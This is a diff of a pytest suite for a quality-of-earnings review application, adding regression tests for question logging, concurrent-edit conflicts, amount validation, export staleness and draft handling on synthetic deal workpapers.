@@ -3,37 +3,49 @@ pure helpers in qoe.ui. Fixtures are small in-memory workpapers; no deal data.""
 
 from __future__ import annotations
 
+import io
 import json
+import re
 import sys
 import types
 from datetime import datetime, timedelta, timezone
 from pathlib import Path
+from typing import Optional
 
 import pytest
 
 from qoe.money import D, dsum, fmt, period_map
 from qoe.review_store import (
+    NO_ENTRY_TOKEN,
     STATUS_AGREED,
     STATUS_OVERRIDDEN,
     STATUS_UNREVIEWED,
+    ConflictError,
     DecisionError,
+    QuestionLogEntry,
     ReviewStore,
+    amount_problem,
     append_timing,
     apply_question_updates,
     apply_reviews,
     bridge_ties,
-    carry_forward_decision,
     check_bridge_identity,
     corrections_summary,
     decision_is_override,
     decision_is_stale,
     decision_problems,
+    decision_token,
     encode_question_update,
     final_amounts,
     latest_by_adj,
     load_timing,
     make_decision,
+    make_question_update,
+    merge_logs,
     parse_question_update,
+    question_token,
+    questions_after,
+    resolve_amounts,
     review_status,
     schedule_from_workpaper,
     timing_summary,
@@ -70,6 +82,11 @@ from qoe.schemas import (
 ROOT = Path(__file__).resolve().parents[1]
 LABELS = ["FY2024", "FY2025"]
 TS = "2026-01-15T10:00:00+00:00"
+
+
+def _plain(markdown: str) -> str:
+    """Text of a message the app escaped for Markdown (qoe.ui.md)."""
+    return re.sub(r"\\(.)", r"\1", markdown)
 
 
 # ---------------------------------------------------------------------------
@@ -503,9 +520,12 @@ def test_diligence_item_final_amounts_follow_management_rules():
     half = make_decision(d1, treatment=Treatment.REVISE, amounts={"FY2025": "9200"},
                          correction_type=CorrectionType.JUDGMENT_DIFFERENCE, **kw)
     assert final_amounts(wp, [agree, half])["D-1"] == _pm("0", "9200")
-    # Accept carries management's claim, which for a diligence item is zero; Reject is zero too.
-    accept = make_decision(d1, treatment=Treatment.ACCEPT, amounts={}, correction_type=CorrectionType.JUDGMENT_DIFFERENCE, **kw)
-    assert final_amounts(wp, [accept])["D-1"] == _pm("0", "0")
+    # Accept on a diligence item carries the tool's proposal (management claimed nothing) and
+    # agrees with the tool; Reject carries zero.
+    accept = make_decision(d1, treatment=Treatment.ACCEPT, amounts={}, **kw)
+    assert final_amounts(wp, [accept])["D-1"] == _pm("0", "18400")
+    reject = make_decision(d1, treatment=Treatment.REJECT, amounts={}, correction_type=CorrectionType.JUDGMENT_DIFFERENCE, **kw)
+    assert final_amounts(wp, [reject])["D-1"] == _pm("0", "0")
     info = make_decision(d1, treatment=Treatment.REQUEST_INFO, amounts={}, correction_type=CorrectionType.NEW_INFORMATION, **kw)
     assert final_amounts(wp, [info])["D-1"] == {}
 
@@ -570,11 +590,67 @@ def test_question_updates_are_cumulative_in_log_order(wp):
     assert unknown == ["Q-X-9"]
 
 
-def test_carry_forward_decision_keeps_treatment_and_amounts():
-    prev = _decision("A-2", Treatment.REVISE, _pm("0", "150"), Treatment.REVISE, _pm("0", "120"), rationale="Retainer excluded.")
-    new = carry_forward_decision(prev, reviewer="M. Manager", question_updates={"Q-A-2-1": "CLOSED"}, timestamp="2026-03-01T00:00:00+00:00")
-    assert (new.treatment, new.amounts, new.rationale) == (prev.treatment, prev.amounts, prev.rationale)
-    assert (new.reviewer, new.question_updates, new.timestamp) == ("M. Manager", {"Q-A-2-1": "CLOSED"}, "2026-03-01T00:00:00+00:00")
+def test_question_update_is_signed_by_its_author_and_never_re_signs_a_decision(wp, tmp_path):
+    """ui-01: a question update used to be a copy of the latest decision, re-signed by
+    whoever typed in the Reviewer box (or by the previous reviewer when it was blank)."""
+    store = ReviewStore.for_workpaper_dir(tmp_path / "toy_deal")
+    a4 = _by_id(wp)["A-4"]
+    decision = _decision("A-4", Treatment.REQUEST_INFO, {}, Treatment.REQUEST_INFO, {}, reviewer="Assoc A", rationale="Need the agreement.")
+    store.append(decision)
+    q1 = a4.open_questions[0]
+    with pytest.raises(DecisionError) as exc:
+        make_question_update(q1, adj_id="A-4", status=QuestionStatus.ANSWERED, response="Sent 3/1", reviewer="  ")
+    assert exc.value.errors == ["Enter the reviewer's name."]
+    assert make_question_update(q1, adj_id="A-4", status=QuestionStatus.OPEN, response="", reviewer="Manager B") is None
+
+    entry = make_question_update(
+        q1, adj_id="A-4", status=QuestionStatus.ANSWERED, response=" Sent 3/1 ", reviewer=" Manager B ", timestamp="2026-03-01T00:00:00+00:00"
+    )
+    store.append_question(entry)
+    assert store.question_path.name == "question_log.jsonl"
+    assert (entry.kind, entry.reviewer, entry.status, entry.response) == ("update", "Manager B", QuestionStatus.ANSWERED, "Sent 3/1")
+    # The decision log is untouched: Assoc A's decision is still the latest, with its own time.
+    assert store.all() == [decision]
+    assert store.latest()["A-4"].reviewer == "Assoc A"
+    out = apply_reviews(wp, store.all(), question_log=store.questions())
+    q = next(q for q in _by_id(out)["A-4"].open_questions if q.q_id == q1.q_id)
+    assert (q.status, q.response) == (QuestionStatus.ANSWERED, "Sent 3/1")
+    # A response-only change leaves the status; an explicit "" clears the response.
+    answered = q1.model_copy(update={"status": QuestionStatus.ANSWERED, "response": "Sent 3/1"})
+    only_status = make_question_update(answered, adj_id="A-4", status=QuestionStatus.CLOSED, response="Sent 3/1", reviewer="B")
+    assert only_status.response is None
+    cleared = make_question_update(answered, adj_id="A-4", status=QuestionStatus.ANSWERED, response="", reviewer="B")
+    assert cleared.response == ""
+
+
+def test_question_updates_do_not_need_a_decision(wp, tmp_path):
+    """ui-15: a management answer can be logged on an unreviewed adjustment."""
+    store = ReviewStore(tmp_path / "review_log.jsonl")
+    q1 = _by_id(wp)["A-4"].open_questions[0]
+    store.append_question(make_question_update(q1, adj_id="A-4", status=QuestionStatus.ANSWERED, response="Insurer paid", reviewer="Ann"))
+    assert store.all() == [] and not store.path.exists()
+    out = apply_reviews(wp, store.all(), question_log=store.questions())
+    assert out.reviews == []
+    assert review_status(_by_id(out)["A-4"], None) == STATUS_UNREVIEWED
+    assert final_amounts(out, {})["A-4"] == {}  # still the tool's proposal (pending)
+    assert _by_id(out)["A-4"].open_questions[0].status == QuestionStatus.ANSWERED
+
+
+def test_decision_and_question_logs_replay_in_time_order(wp):
+    older = _decision("A-4", Treatment.REQUEST_INFO, {}, Treatment.REQUEST_INFO, {}, timestamp="2026-01-01T00:00:00+00:00",
+                      question_updates={"Q-A-4-1": "CLOSED: from an old log"})
+    newer = _decision("A-2", Treatment.REVISE, _pm("0", "120"), Treatment.REVISE, _pm("0", "120"), timestamp="2026-03-01T00:00:00+00:00",
+                      question_updates={"Q-A-4-2": "CLOSED"})
+    mid = QuestionLogEntry(kind="update", q_id="Q-A-4-1", adj_id="A-4", reviewer="B", timestamp="2026-02-01T00:00:00+00:00",
+                           status=QuestionStatus.ANSWERED, response="Paid")
+    mid2 = QuestionLogEntry(kind="update", q_id="Q-A-4-2", adj_id="A-4", reviewer="B", timestamp="2026-02-02T00:00:00+00:00",
+                            status=QuestionStatus.ANSWERED)
+    assert merge_logs([older, newer], [mid, mid2]) == [older, mid, mid2, newer]
+    assessments = [a.model_copy(deep=True) for a in wp.assessments]
+    apply_question_updates(assessments, [older, newer], [mid, mid2])
+    qs = {q.q_id: q for a in assessments for q in a.open_questions}
+    assert (qs["Q-A-4-1"].status, qs["Q-A-4-1"].response) == (QuestionStatus.ANSWERED, "Paid")
+    assert qs["Q-A-4-2"].status == QuestionStatus.CLOSED
 
 
 # ---------------------------------------------------------------------------
@@ -620,7 +696,10 @@ def test_make_decision_treatment_amount_semantics(wp):
     assert accept.amounts == _pm("0", "200")  # accept carries the claim as presented
     reject = make_decision(a["A-1"], treatment=Treatment.REJECT, amounts={"FY2025": "999"}, **kw)
     assert reject.amounts == _pm("0", "0")
-    info = make_decision(a["A-1"], treatment=Treatment.REQUEST_INFO, amounts={"FY2025": "999"}, **kw)
+    with pytest.raises(DecisionError):  # A-1 has no question for management to carry the request
+        make_decision(a["A-1"], treatment=Treatment.REQUEST_INFO, amounts={"FY2025": "999"}, **kw)
+    ask = questions_after(a["A-1"].open_questions, new_texts=["Provide the invoice."])
+    info = make_decision(a["A-1"], treatment=Treatment.REQUEST_INFO, amounts={"FY2025": "999"}, questions=ask, **kw)
     assert info.amounts == {}
     same_info = make_decision(a["A-4"], treatment=Treatment.REQUEST_INFO, amounts={}, rationale="", reviewer="Ann", labels=LABELS)
     assert same_info.tool_amounts == {} and not decision_is_override(same_info)
@@ -728,6 +807,7 @@ def test_code_and_row_helpers():
 
 
 def test_discover_deals_and_paths(tmp_path, monkeypatch):
+    monkeypatch.setenv(ui.SHOW_HOLDOUT_ENV, "1")
     (tmp_path / "dev" / "alpha").mkdir(parents=True)
     (tmp_path / "dev" / "alpha" / "deal.yaml").write_text("deal_id: alpha_co\ntarget_name: Alpha Co (SYNTHETIC)\n")
     (tmp_path / "dev" / "not_a_deal").mkdir()
@@ -764,8 +844,9 @@ def test_queue_rows_and_status_counts(wp):
     assert rows["A-2"]["Status"] == STATUS_OVERRIDDEN and rows["A-2"]["Reviewer"] == "Reject"
     assert rows["A-2"]["Final FY2025"] == "-" and rows["A-2"]["Proposed FY2025"] == "120"
     assert rows["A-2"]["Top flags"] == "Already excluded from EBITDA, Continuing obligation, Recurring pattern (+1)"
-    assert rows["A-2"]["GL links"] == 2 and rows["A-2"]["Docs"] == 1
-    assert rows["A-4"]["Bridge"] == "Pending" and rows["A-4"]["Final FY2024"] == "pending"
+    assert rows["A-2"]["GL links"] == 3 and rows["A-2"]["Supporting GL links"] == 2 and rows["A-2"]["Docs"] == 1
+    assert rows["A-4"]["Bridge"] == "Excluded (pending)" and rows["A-4"]["Final FY2024"] == "pending"
+    assert rows["A-2"]["Bridge"] == "Carried at 0" and rows["A-1"]["Bridge"] == "Carried"
     assert rows["A-4"]["Open Qs"] == 2
     assert rows["A-5"]["Final FY2025"] == "(40)" and rows["A-1"]["Status"] == STATUS_UNREVIEWED
 
@@ -787,7 +868,7 @@ def test_queue_groups_put_diligence_items_after_management_items():
     ]
     d1 = groups[1][1][0]
     assert (d1["Claimed FY2025"], d1["Proposed FY2025"], d1["Final FY2025"]) == ("-", "18,400", "18,400")
-    assert d1["Tool"] == "Revise" and d1["Status"] == STATUS_UNREVIEWED and d1["Bridge"] == "Included"
+    assert d1["Tool"] == "Revise" and d1["Status"] == STATUS_UNREVIEWED and d1["Bridge"] == "Carried"
     # No diligence items: a single management group.
     plain = _workpaper()
     assert [g for g, _ in ui.queue_groups(ui.queue_rows(plain, {}, final_amounts(plain, {})))] == [ui.GROUP_MANAGEMENT]
@@ -861,7 +942,7 @@ def test_gl_link_rows_join_gl_and_flags(wp):
     r12 = rows[1]
     assert (r12["Account"], r12["Doc #"], r12["Amount"]) == ("6400 Legal", "INV-7", "80.00")
     assert r12["Challenged by"] == "Continuing obligation, Recurring pattern"
-    assert rows[2]["Supports claim"] == "No (context)"
+    assert rows[2]["Role"] == "Context (not part of the claim)"
 
 
 def test_question_issue_and_history_rows(wp):
@@ -969,7 +1050,7 @@ def test_app_renders_pages_and_records_decision(wp, tmp_path, monkeypatch):
     assert decisions[0].amounts == _pm("0", "0") and decisions[0].tool_amounts == _pm("0", "120")
     timing = load_timing(wp_path.parent / "timing.jsonl")
     assert [t["adj_id"] for t in timing] == ["A-2"] and timing[0]["seconds"] >= 0
-    assert any("Recorded Reject for A-2" in s.value for s in at.success)
+    assert any("Recorded Reject for A-2" in _plain(s.value) for s in at.success)
 
 
 def test_app_reviews_a_diligence_item(tmp_path, monkeypatch):
@@ -1006,3 +1087,664 @@ def test_app_reviews_a_diligence_item(tmp_path, monkeypatch):
     assert [(d.adj_id, d.treatment, d.amounts, d.correction_type) for d in decisions] == [
         ("D-1", Treatment.REVISE, _pm("0", "18400"), CorrectionType.NONE)
     ]
+
+
+# ---------------------------------------------------------------------------
+# Regression tests for the review findings (ui-*, security-*, excel-pending-*)
+# ---------------------------------------------------------------------------
+
+
+def _app(wp: Workpaper, tmp_path: Path, monkeypatch, page: str = "Overview", adj: Optional[str] = None):
+    """A fresh app session on ``wp`` (no deal package), and the workpaper directory."""
+    testing = pytest.importorskip("streamlit.testing.v1")
+    (tmp_path / "data").mkdir(parents=True, exist_ok=True)
+    monkeypatch.setenv("QOE_DATA_DIR", str(tmp_path / "data"))
+    monkeypatch.setenv("QOE_WORKPAPERS_DIR", str(tmp_path / "wp"))
+    wp_path = tmp_path / "wp" / wp.deal.deal_id / "workpaper.json"
+    if not wp_path.exists():
+        wp_path.parent.mkdir(parents=True, exist_ok=True)
+        wp_path.write_text(wp.model_dump_json())
+    at = testing.AppTest.from_file(str(ROOT / "qoe" / "ui.py"), default_timeout=60)
+    at.session_state["wp_path"] = str(wp_path)
+    at.session_state["page"] = page
+    if adj is not None:
+        at.session_state["adj_select"] = adj
+    at.run()
+    assert not at.exception
+    return at, wp_path.parent
+
+
+def _click(at, label: str):
+    next(b for b in at.button if b.label == label).click().run()
+    assert not at.exception
+    return at
+
+
+def _texts(elements) -> list[str]:
+    return [_plain(e.value) for e in elements]
+
+
+# -- ui-01 / ui-15: question updates are their own log lines ------------------------------
+
+
+def test_app_question_update_needs_a_name_and_does_not_touch_decisions(wp, tmp_path, monkeypatch):
+    at, wdir = _app(wp, tmp_path, monkeypatch)
+    store = ReviewStore.for_workpaper_dir(wdir)
+    prior = _decision("A-4", Treatment.REQUEST_INFO, {}, Treatment.REQUEST_INFO, {}, reviewer="Assoc A", rationale="Need the agreement.")
+    store.append(prior)
+    at.session_state["page"] = "Open questions"
+    at.run()
+    at.selectbox(key="oq_pick").set_value("Q-A-4-1").run()
+    at.selectbox(key="oq_status:Q-A-4-1").set_value(QuestionStatus.ANSWERED)
+    at.text_input(key="oq_response:Q-A-4-1").input("Agreement sent 3/1")
+    _click(at, "Record update")  # Reviewer box is blank
+    assert "Enter the reviewer's name." in _texts(at.error)
+    assert not store.question_path.exists() and store.all() == [prior]
+
+    at.text_input(key="reviewer").input("Manager B")
+    at.selectbox(key="oq_status:Q-A-4-1").set_value(QuestionStatus.ANSWERED)
+    at.text_input(key="oq_response:Q-A-4-1").input("Agreement sent 3/1")
+    _click(at, "Record update")
+    assert store.all() == [prior]  # no decision line was written or re-signed
+    [entry] = store.questions()
+    assert (entry.q_id, entry.reviewer, entry.status, entry.response) == ("Q-A-4-1", "Manager B", QuestionStatus.ANSWERED, "Agreement sent 3/1")
+    assert store.latest()["A-4"].reviewer == "Assoc A"
+
+
+def test_app_logs_a_management_answer_on_an_unreviewed_adjustment(wp, tmp_path, monkeypatch):
+    at, wdir = _app(wp, tmp_path, monkeypatch, page="Open questions")
+    at.text_input(key="reviewer").input("Ann")
+    at.selectbox(key="oq_pick").set_value("Q-A-4-2").run()
+    at.text_input(key="oq_response:Q-A-4-2").input("Market data attached")
+    at.selectbox(key="oq_status:Q-A-4-2").set_value(QuestionStatus.ANSWERED)
+    _click(at, "Record update")
+    store = ReviewStore.for_workpaper_dir(wdir)
+    assert store.all() == []
+    assert [(e.q_id, e.status) for e in store.questions()] == [("Q-A-4-2", QuestionStatus.ANSWERED)]
+    at.session_state["page"] = "Adjustment queue"
+    at.run()
+    assert not at.exception
+    row = {r["Ref"]: r for r in ui.queue_rows(*_ctx_parts(wdir, wp))}["A-4"]
+    assert row["Status"] == STATUS_UNREVIEWED
+
+
+def _ctx_parts(wdir: Path, wp: Workpaper):
+    store = ReviewStore.for_workpaper_dir(wdir)
+    decisions = store.all()
+    applied = apply_reviews(wp, decisions, question_log=store.questions())
+    latest = latest_by_adj(decisions)
+    return applied, latest, final_amounts(applied, latest)
+
+
+# -- ui-02: a stale page cannot overwrite a newer decision --------------------------------
+
+
+def test_store_conditional_append_refuses_a_decision_built_on_an_older_one(tmp_path):
+    store = ReviewStore(tmp_path / "review_log.jsonl")
+    b = _decision("A-2", Treatment.REJECT, _pm("0", "0"), Treatment.REVISE, _pm("0", "120"), reviewer="Manager B")
+    store.append(b, expected_token=NO_ENTRY_TOKEN)  # B's form was built when nothing was recorded
+    a = _decision("A-2", Treatment.ACCEPT, _pm("0", "200"), Treatment.REVISE, _pm("0", "120"), reviewer="Assoc A")
+    with pytest.raises(ConflictError) as exc:
+        store.append(a, expected_token=NO_ENTRY_TOKEN)  # A's page predates B's decision
+    assert "Manager B" in str(exc.value) and exc.value.current == b
+    assert store.all() == [b]
+    store.append(a, expected_token=decision_token(b))  # after reviewing B's decision
+    assert store.latest()["A-2"] == a
+    # Other adjustments are unaffected by the check.
+    store.append(_decision("A-1", Treatment.ACCEPT, _pm("0", "100"), Treatment.ACCEPT, _pm("0", "100")), expected_token=NO_ENTRY_TOKEN)
+    q = QuestionLogEntry(kind="update", q_id="Q-A-4-1", adj_id="A-4", reviewer="B", timestamp=TS, status=QuestionStatus.CLOSED)
+    store.append_question(q, expected_token=NO_ENTRY_TOKEN)
+    with pytest.raises(ConflictError):
+        store.append_question(q, expected_token=NO_ENTRY_TOKEN)
+    assert question_token(store.questions(), "Q-A-4-1") != NO_ENTRY_TOKEN
+
+
+def test_app_stale_form_does_not_overwrite_a_colleagues_newer_decision(wp, tmp_path, monkeypatch):
+    at_a, wdir = _app(wp, tmp_path, monkeypatch, page="Adjustment detail", adj="A-2")
+    at_a.text_input(key="reviewer").input("Assoc A")
+    at_a.run()
+    at_b, _ = _app(wp, tmp_path, monkeypatch, page="Adjustment detail", adj="A-2")
+    at_b.text_input(key="reviewer").input("Manager B")
+    at_b.radio(key="f:A-2:treatment").set_value(Treatment.REJECT)
+    at_b.text_area(key="f:A-2:rationale").input("Litigation recurs every year.")
+    at_b.selectbox(key="f:A-2:correction").set_value(CorrectionType.JUDGMENT_DIFFERENCE)
+    _click(at_b, "Record decision")
+    store = ReviewStore.for_workpaper_dir(wdir)
+    assert [d.reviewer for d in store.all()] == ["Manager B"]
+
+    # A's page was built before B's decision, and A has a draft (the reviewer name alone is not one).
+    at_a.text_area(key="f:A-2:rationale").input("Agree with the tool.")
+    _click(at_a, "Record decision")
+    assert [d.reviewer for d in store.all()] == ["Manager B"]
+    assert any("decided by Manager B" in t for t in _texts(at_a.warning) + _texts(at_a.error))
+    # After reviewing B's decision, A can keep the draft and record it deliberately.
+    _click(at_a, "Keep my draft: I have reviewed the newer decision")
+    at_a.radio(key="f:A-2:treatment").set_value(Treatment.REVISE)
+    at_a.text_area(key="f:A-2:rationale").input("Retainer only; litigation is one-off.")
+    at_a.run()
+    _click(at_a, "Record decision")
+    assert [d.reviewer for d in store.all()] == ["Manager B", "Assoc A"]
+
+
+# -- ui-03: non-finite and huge amounts are form errors, not crashes ----------------------
+
+
+@pytest.mark.parametrize("bad", ["NaN", "nan", "sNaN", "Infinity", "-inf", "1e999999", "1e20"])
+def test_decision_problems_reject_non_finite_or_huge_amounts(wp, bad):
+    a2 = _by_id(wp)["A-2"]
+    kw = dict(rationale="x", reviewer="Ann", labels=LABELS, correction_type=CorrectionType.JUDGMENT_DIFFERENCE)
+    errors, _ = decision_problems(a2, treatment=Treatment.REVISE, amounts={"FY2024": "0", "FY2025": bad}, **kw)
+    assert len(errors) == 1 and errors[0].startswith("Amount is") and errors[0].endswith("for: FY2025.")
+    with pytest.raises(DecisionError):
+        make_decision(a2, treatment=Treatment.REVISE, amounts={"FY2025": bad}, **kw)
+    assert amount_problem(bad) is not None and amount_problem("(1,234.50)") is None
+
+
+def test_app_nan_amount_shows_an_error_and_keeps_the_app_up(wp, tmp_path, monkeypatch):
+    at, wdir = _app(wp, tmp_path, monkeypatch, page="Adjustment detail", adj="A-2")
+    at.text_input(key="reviewer").input("Ann")
+    at.text_input(key="f:A-2:amt:FY2025").input("NaN")  # typed, not yet "entered"
+    _click(at, "Record decision")
+    assert not at.exception
+    assert any("not a number for: FY2025" in t for t in _texts(at.error))
+    assert ReviewStore.for_workpaper_dir(wdir).all() == []
+    assert at.text_input(key="reviewer").value == "Ann"  # session state survived
+
+
+# -- ui-04: a re-review starts with a blank rationale -------------------------------------
+
+
+def test_form_seed_blanks_rationale_and_correction_on_re_review(wp):
+    a2 = _by_id(wp)["A-2"]
+    prior = _decision("A-2", Treatment.REVISE, _pm("0", "90"), Treatment.REVISE, _pm("0", "120"),
+                      rationale="Policy review is one-off; include.", correction_type=CorrectionType.JUDGMENT_DIFFERENCE)
+    seed = ui.form_seed(a2, prior, LABELS)
+    assert (seed["treatment"], seed["amt:FY2025"], seed["rationale"], seed["correction"]) == (
+        Treatment.REVISE, "90.00", "", CorrectionType.NONE)
+    # The old rationale cannot carry a different decision.
+    kw = dict(reviewer="Ann", labels=LABELS, correction_type=CorrectionType.JUDGMENT_DIFFERENCE, previous=prior)
+    errors, _ = decision_problems(a2, treatment=Treatment.REJECT, amounts={}, rationale=" Policy review is one-off;  include. ", **kw)
+    assert any("written for the previous decision" in e for e in errors)
+    errors, _ = decision_problems(a2, treatment=Treatment.REVISE, amounts={"FY2025": "90"}, rationale=prior.rationale, **kw)
+    assert errors == []  # re-confirming the same decision may keep its reasons
+
+
+def test_app_re_review_does_not_prefill_the_old_rationale(wp, tmp_path, monkeypatch):
+    at, wdir = _app(wp, tmp_path, monkeypatch, page="Adjustment detail", adj="A-2")
+    at.text_input(key="reviewer").input("Ann")
+    at.text_input(key="f:A-2:amt:FY2025").input("90")
+    at.text_area(key="f:A-2:rationale").input("Policy review is one-off; include.")
+    at.selectbox(key="f:A-2:correction").set_value(CorrectionType.JUDGMENT_DIFFERENCE)
+    _click(at, "Record decision")
+    assert [d.amounts["FY2025"] for d in ReviewStore.for_workpaper_dir(wdir).all()] == ["90.00"]
+    assert at.text_area(key="f:A-2:rationale").value == ""
+    assert at.selectbox(key="f:A-2:correction").value == CorrectionType.NONE
+    assert any("Policy review is one-off" in str(h.proto) for h in at.get("html"))  # shown read-only
+    at.radio(key="f:A-2:treatment").set_value(Treatment.REJECT)
+    at.run()
+    _click(at, "Record decision")
+    assert len(ReviewStore.for_workpaper_dir(wdir).all()) == 1  # blocked: no rationale for the new decision
+
+
+# -- ui-05: an out-of-date workbook is not offered ----------------------------------------
+
+
+def test_export_status_tracks_the_review_state(tmp_path):
+    paths = ui.workpaper_paths("toy_deal", base=tmp_path)
+    paths.root.mkdir(parents=True)
+    paths.workpaper.write_text("{}")
+    sig = ui.review_state_signature(paths, has_pkg=True)
+    assert ui.export_status(paths, sig) == (ui.EXPORT_MISSING, None)
+    paths.xlsx.write_bytes(b"workbook")
+    assert ui.export_status(paths, sig)[0] == ui.EXPORT_UNKNOWN  # not built by the app
+    ui.write_export_stamp(paths, sig, "2026-03-01T10:00:00+00:00")
+    assert ui.export_status(paths, sig) == (ui.EXPORT_CURRENT, "2026-03-01T10:00:00+00:00")
+    ReviewStore(paths.review_log).append(_decision("A-1", Treatment.ACCEPT, _pm("0", "100"), Treatment.ACCEPT, _pm("0", "100")))
+    later = ui.review_state_signature(paths, has_pkg=True)
+    assert later != sig and ui.export_status(paths, later)[0] == ui.EXPORT_STALE
+    q = QuestionLogEntry(kind="update", q_id="Q-1", adj_id="A-1", reviewer="B", timestamp=TS, status=QuestionStatus.CLOSED)
+    ReviewStore(paths.review_log).append_question(q)
+    assert ui.review_state_signature(paths, has_pkg=True) != later
+    assert ui.review_state_signature(paths, has_pkg=False) != ui.review_state_signature(paths, has_pkg=True)
+    ui.write_export_stamp(paths, later, "t")
+    paths.xlsx.write_bytes(b"rewritten from the command line")
+    assert ui.export_status(paths, later)[0] == ui.EXPORT_UNKNOWN
+
+
+def test_app_export_download_is_disabled_once_a_decision_postdates_the_workbook(wp, tmp_path, monkeypatch):
+    import qoe.export_xlsx
+
+    def fake_export(w, out_path, **kw):
+        Path(out_path).write_bytes(f"reviews={len(w.reviews)}".encode())
+        return Path(out_path)
+
+    monkeypatch.setattr(qoe.export_xlsx, "export_workpaper", fake_export)
+    at, wdir = _app(wp, tmp_path, monkeypatch, page="Export")
+    _click(at, "Build Excel workpaper")
+
+    def xlsx_button():
+        return next(d for d in at.get("download_button") if d.proto.label.startswith("Download QoE"))
+
+    assert not xlsx_button().proto.disabled
+    ReviewStore.for_workpaper_dir(wdir).append(_decision("A-1", Treatment.ACCEPT, _pm("0", "100"), Treatment.ACCEPT, _pm("0", "100")))
+    at.run()
+    assert xlsx_button().proto.disabled
+    assert any("before later review changes" in t for t in _texts(at.warning))
+    _click(at, "Build Excel workpaper")
+    assert not xlsx_button().proto.disabled
+    assert (wdir / f"QoE_Evidence_Review_{wp.deal.deal_id}.xlsx").read_bytes() == b"reviews=1"
+
+
+# -- ui-06: drafts survive navigation ------------------------------------------------------
+
+
+def test_app_unsent_draft_survives_next_previous_and_page_switch(wp, tmp_path, monkeypatch):
+    at, wdir = _app(wp, tmp_path, monkeypatch, page="Adjustment detail", adj="A-3")
+    at.text_area(key="f:A-3:rationale").input("DRAFT: club dues personal, travel business")
+    at.run()
+    _click(at, "Next")
+    assert at.selectbox(key="adj_select").value == "A-4"
+    _click(at, "Previous")
+    assert at.text_area(key="f:A-3:rationale").value == "DRAFT: club dues personal, travel business"
+    at.session_state["page"] = "Adjustment queue"
+    at.run()
+    assert ui.form_is_dirty(at.session_state, "A-3") and not ui.form_is_dirty(at.session_state, "A-4")
+    at.session_state["page"] = "Adjustment detail"
+    at.run()
+    assert at.text_area(key="f:A-3:rationale").value == "DRAFT: club dues personal, travel business"
+    assert any("Unsent draft" in str(h.proto) for h in at.get("html"))
+    assert ReviewStore.for_workpaper_dir(wdir).all() == []
+
+
+def test_queue_marks_unsent_drafts(wp):
+    finals = final_amounts(wp, {})
+    rows = {r["Ref"]: r for r in ui.queue_rows(wp, {}, finals, drafts=["A-3"])}
+    assert rows["A-3"]["Status"] == STATUS_UNREVIEWED + ui.DRAFT_SUFFIX
+    assert rows["A-3"]["Status"].split(" (")[0] == STATUS_UNREVIEWED  # status filter still works
+    state = {"fd:A-3": {"rationale": "", "treatment": Treatment.REJECT}, "f:A-3:rationale": "", "f:A-3:treatment": Treatment.REJECT}
+    assert not ui.form_is_dirty(state, "A-3")
+    state["f:A-3:treatment"] = Treatment.ACCEPT
+    assert ui.form_is_dirty(state, "A-3")
+
+
+# -- ui-07: Accept on a diligence item carries the tool's proposal ------------------------
+
+
+def test_accept_on_a_diligence_item_carries_the_tool_proposal_and_agrees():
+    d1 = _diligence_item()
+    assert resolve_amounts(d1, Treatment.ACCEPT, {}, LABELS) == _pm("0", "18400")
+    errors, _ = decision_problems(d1, treatment=Treatment.ACCEPT, amounts={}, rationale="", reviewer="Ann",
+                                  correction_type=CorrectionType.NONE, labels=LABELS)
+    assert errors == []
+    accept = make_decision(d1, treatment=Treatment.ACCEPT, amounts={}, rationale="", reviewer="Ann", labels=LABELS)
+    assert (accept.treatment, accept.amounts, accept.tool_treatment) == (Treatment.ACCEPT, _pm("0", "18400"), Treatment.REVISE)
+    assert not decision_is_override(accept) and review_status(d1, accept) == STATUS_AGREED
+    summary = corrections_summary([accept])
+    assert summary["overridden"] == 0 and summary["unclassified_overrides"] == []
+    # A management item's Accept still carries the claim and overrides a REVISE proposal.
+    wp = _workpaper()
+    a2 = _by_id(wp)["A-2"]
+    assert resolve_amounts(a2, Treatment.ACCEPT, {}, LABELS) == _pm("0", "200")
+    errors, _ = decision_problems(a2, treatment=Treatment.ACCEPT, amounts={}, rationale="", reviewer="Ann",
+                                  correction_type=CorrectionType.NONE, labels=LABELS)
+    assert len(errors) == 2
+    # A diligence item with no proposal has nothing for Accept to carry.
+    empty = _diligence_item(treatment=Treatment.REQUEST_INFO, proposed={})
+    errors, _ = decision_problems(empty, treatment=Treatment.ACCEPT, amounts={}, rationale="x", reviewer="Ann",
+                                  correction_type=CorrectionType.JUDGMENT_DIFFERENCE, labels=LABELS)
+    assert any("use Revise" in e for e in errors)
+    assert ui.treatment_labels_for(d1)[Treatment.ACCEPT] == "Accept (carry the tool's amount)"
+    assert ui.treatment_labels_for(a2)[Treatment.ACCEPT] == "Accept"
+
+
+def test_app_accept_on_diligence_item_records_the_proposal(tmp_path, monkeypatch):
+    wp = _wp_with_diligence(store_schedule=True)
+    at, wdir = _app(wp, tmp_path, monkeypatch, page="Adjustment detail", adj="D-1")
+    at.text_input(key="reviewer").input("Ann")
+    at.radio(key="f:D-1:treatment").set_value(Treatment.ACCEPT)
+    at.run()
+    assert any("tool's proposed diligence amount" in c for c in _texts(at.caption))
+    assert not any("Needed before recording" in t for t in _texts(at.warning))
+    _click(at, "Record decision")
+    [d] = ReviewStore.for_workpaper_dir(wdir).all()
+    assert (d.treatment, d.amounts, d.correction_type) == (Treatment.ACCEPT, _pm("0", "18400"), CorrectionType.NONE)
+
+
+# -- ui-08: flag amounts are labelled by what they measure --------------------------------
+
+
+def test_flag_amounts_show_ebitda_effects_only_from_flag_effects():
+    excess = Flag(code=FlagCode.EXCESS_GL_ACTIVITY, severity=Severity.INFO, message="Other 126,000 is context.",
+                  period_label="FY2025", amount_impact="126000")
+    assert ui.flag_amount_notes(excess) == ["Context activity (not claimed) 126,000"]
+    assert "EBITDA effect" not in ui.flag_html(excess)
+    partial = Flag(code=FlagCode.PARTIAL_GL_SUPPORT, severity=Severity.WARNING, message="m", amount_impact="-5000")
+    assert ui.flag_amount_notes(partial) == ["GL shortfall (5,000)"]
+    overlap = Flag(code=FlagCode.OVERLAP_WITH_OTHER_ADJUSTMENT, severity=Severity.WARNING, message="m",
+                   effects={"TTM Jun-26": "-21000", "FY2025": "-21000", "FY2024": "0"})
+    assert ui.flag_amount_notes(overlap, ["FY2024", "FY2025", "TTM Jun-26"]) == [
+        "EBITDA effect FY2025 (21,000)", "EBITDA effect TTM Jun-26 (21,000)"]
+    assert "EBITDA effect FY2025 (21,000)" in ui.flag_html(overlap, ["FY2025", "TTM Jun-26"])
+    other = Flag(code=FlagCode.SIGN_ERROR, severity=Severity.WARNING, message="m", amount_impact="-5")
+    assert ui.flag_amount_notes(other) == ["Amount at issue (5)"]
+
